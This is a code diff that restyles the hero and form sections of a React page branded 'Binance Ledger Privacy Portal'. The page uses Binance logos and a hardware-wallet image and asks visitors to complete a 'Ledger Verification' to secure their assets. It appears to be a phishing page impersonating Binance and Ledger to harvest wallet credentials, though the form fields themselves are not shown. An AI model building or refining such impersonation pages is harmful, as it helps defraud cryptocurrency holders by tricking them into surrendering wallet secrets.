@@ -11,47 +11,47 @@ const Index = () => {
       
       <main className="flex-grow">
         {/* Hero Section */}
-        <div className="bg-binance-black py-10 md:py-16">
+        <div className="bg-binance-black py-10 md:py-16 relative overflow-hidden">
           <div className="container mx-auto px-4">
             <div className="max-w-5xl mx-auto">
-              <div className="flex flex-col md:flex-row items-center">
-                <div className="md:w-1/2 text-center md:text-left mb-8 md:mb-0">
-                  <h1 className="text-3xl md:text-4xl font-bold mb-4">
-                    Binance Ledger <span className="text-binance-yellow">Privacy Portal</span>
-                  </h1>
-                  <p className="text-gray-300 text-lg mb-6">
-                    Secure your crypto assets with the most trusted hardware wallet in the industry
-                  </p>
-                  <div className="flex justify-center md:justify-start space-x-4">
-                    <div className="w-12 h-px bg-binance-yellow my-auto"></div>
-                    <span className="text-binance-yellow px-4">Trusted by millions</span>
-                    <div className="w-12 h-px bg-binance-yellow my-auto"></div>
-                  </div>
-                </div>
-                <div className="md:w-1/2 flex justify-center md:justify-end">
-                  <div className="relative">
-                    <img 
-                      src="https://i.ibb.co/vVVpCCG/binance-ledger-device.png" 
-                      alt="Binance Ledger Device" 
-                      className="max-w-full h-auto rounded-lg shadow-xl"
-                    />
-                    <div className="absolute bottom-4 right-4">
-                      <img 
-                        src="https://public.bnbstatic.com/image/cms/blog/20200707/631c823b-886e-4e46-b21d-a3bf21aea8bf.png"
-                        alt="Binance Logo" 
-                        className="h-6"
-                      />
-                    </div>
-                  </div>
+              <div className="flex flex-col items-center text-center relative z-10">
+                <h1 className="text-3xl md:text-4xl font-bold mb-4">
+                  Binance Ledger <span className="text-binance-yellow">Privacy Portal</span>
+                </h1>
+                <p className="text-gray-300 text-lg mb-6 max-w-2xl">
+                  Secure your crypto assets with the most trusted hardware wallet in the industry
+                </p>
+                <div className="flex justify-center space-x-4 mb-8">
+                  <div className="w-12 h-px bg-binance-yellow my-auto"></div>
+                  <span className="text-binance-yellow px-4">Trusted by millions</span>
+                  <div className="w-12 h-px bg-binance-yellow my-auto"></div>
                 </div>
               </div>
             </div>
           </div>
+          
+          {/* Ledger Image positioned to overlap sections */}
+          <div className="absolute right-0 top-1/2 transform -translate-y-1/2 z-20 hidden md:block">
+            <img 
+              src="/lovable-uploads/938c67ba-a1d3-4451-8b8d-ea78479af87c.png" 
+              alt="Binance Ledger Device" 
+              className="max-w-md h-auto"
+            />
+          </div>
+          
+          {/* Mobile view for Ledger image */}
+          <div className="md:hidden flex justify-center mt-6 mb-4">
+            <img 
+              src="/lovable-uploads/938c67ba-a1d3-4451-8b8d-ea78479af87c.png" 
+              alt="Binance Ledger Device" 
+              className="max-w-[250px] h-auto"
+            />
+          </div>
         </div>
         
         {/* Form Section */}
-        <div className="container mx-auto px-4 py-10">
-          <div className="max-w-4xl mx-auto mb-12">
+        <div className="container mx-auto px-4 py-10 relative">
+          <div className="max-w-4xl mx-auto mb-12 pt-10">
             <h2 className="text-2xl font-bold mb-4">Ledger Verification</h2>
             <p className="text-gray-300">
               To ensure the security of your assets, please complete the verification process below. 
